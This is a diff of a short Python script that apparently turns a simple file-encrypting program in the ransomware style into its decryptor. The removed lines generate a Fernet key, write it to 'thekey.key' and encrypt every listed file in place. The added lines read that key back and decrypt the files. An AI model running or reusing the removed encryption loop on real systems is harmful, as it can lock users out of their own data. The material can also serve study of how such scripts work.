@@ -14,14 +14,12 @@ for file in os.listdir():
 
 print(files)
 
-key = Fernet.generate_key()
-
-with open("thekey.key", "wb") as thekey:
-        thekey.write(key)
+with open("thekey.key","rb") as key:
+        secretkey = key.read()
 
 for file in files:
         with open(file, "rb") as thefile:
                 contents = thefile.read()
-        contents_encrypted = Fernet(key).encrypt(contents)
+        contents_decrypted = Fernet(secretkey).decrypt(contents)
         with open(file,"wb") as thefile:
-                thefile.write(contents_encrypted)
+                thefile.write(contents_decrypted)
